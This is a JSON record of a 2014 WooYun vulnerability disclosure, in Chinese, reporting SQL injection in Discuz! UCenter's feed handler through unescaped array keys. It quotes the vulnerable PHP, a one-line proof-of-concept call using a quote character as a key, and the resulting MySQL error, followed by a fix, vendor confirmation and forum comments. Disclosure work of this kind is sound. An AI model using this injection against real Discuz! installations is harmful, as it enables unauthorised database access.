{"id": 48425, "wybug_id": "wooyun-2014-083045", "wybug_title": "知道key的情况下对ucserver进行注射", "wybug_corp": "Discuz!", "wybug_author": "Ray", "wybug_date": "2014-11-12 18:33", "wybug_open_date": "2014-12-27 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向公众公开  简要描述： 因为帮finger解决问题，无意中看到的漏洞。怎么拿到key要问finger。 详细说明：  在/uc_server/control/feed.php内有一段代码：\nfunction onadd() {\t\t$this->load('misc');\t\t$appid = intval($this->input('appid'));\t\t$icon = $this->input('icon');\t\t$uid = intval($this->input('uid'));\t\t$username = $this->input('username');\t\t$body_data = $_ENV['misc']->array2string($this->input('body_data'));\n中的\n$body_data = $_ENV['misc']->array2string($this->input('body_data'));\n中的array2string实际上的代码如下：\nfunction array2string($arr) {\t\t$s = $sep = '';\t\tif($arr && is_array($arr)) {\t\t\tforeach($arr as $k => $v) {\t\t\t\t$s .= $sep.$k.UC_ARRAY_SEP_1.$v;\t\t\t\t$sep = UC_ARRAY_SEP_2;\t\t\t}\t\t}\t\treturn $s;\t}\nDiscuz的daddslashes并不处理key，所以：\n$tmp = call_user_func(UC_API_FUNC, 'feed', 'add',array('body_data'=>array(\"'\"=>'aaa')));\n这里的调用使用key为单引号便可以触发SQL注射。   漏洞证明：  利用代码\n$tmp = call_user_func(UC_API_FUNC, 'feed', 'add',array('body_data'=>array(\"'\"=>'aaa')));\n<b>UCenter info:</b> MySQL Query Error<br /><b>SQL:</b>INSERT INTO [Table]feedsSET appid='0', icon='', uid='0', username='',                        title_template='', title_data='', body_template='', body_data=''UC_ARRAY_SEP_1aaa', body_general='',                        image_1='', image_1_link='', image_2='', image_2_link='',                        image_3='', image_3_link='', image_4='', image_4_link='',                        hash_template='d41d8cd98f00b204e9800998ecf8427e', hash_data='c80d91f685d2292acad8bc4cf8542c7c', target_ids='', dateline='1415787848'<br/><b>Error:</b>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UC_ARRAY_SEP_1aaa', body_general='',\\x0D\\x0A\\x09\\x09\\x09image_1='', image_1_link' at line2<br /><b>Errno:</b>1064<br />   修复方案：  将key也做addslashes操作。   版权声明：转载请注明来源 Ray@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-11-17 16:52 厂商回复： 谢谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-12 18:37 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  这个key是任何一个uc_server中的应用的key，不是uc_server的key    \n     2014-11-12 18:37 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  怎么拿到key 找我拿wb换    \n     2014-11-12 18:50 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  @Finger .    \n     2014-11-12 19:09 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  ......    \n     2014-11-12 23:35 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @s0mun5 支持打白条么？    \n     2014-11-13 00:44 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  洞主上次发动还是三年前    \n     2014-11-13 09:37 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  楼主，是不是找到了秘籍在潜心修炼。我猜是葵花宝典！    \n     2015-07-07 03:02 |    \t\th4ckhell00 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 最温暖的两个字是什么？1、我在。2、别怕。...)\t\t \n  @s0mun5 支持人民币吗    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}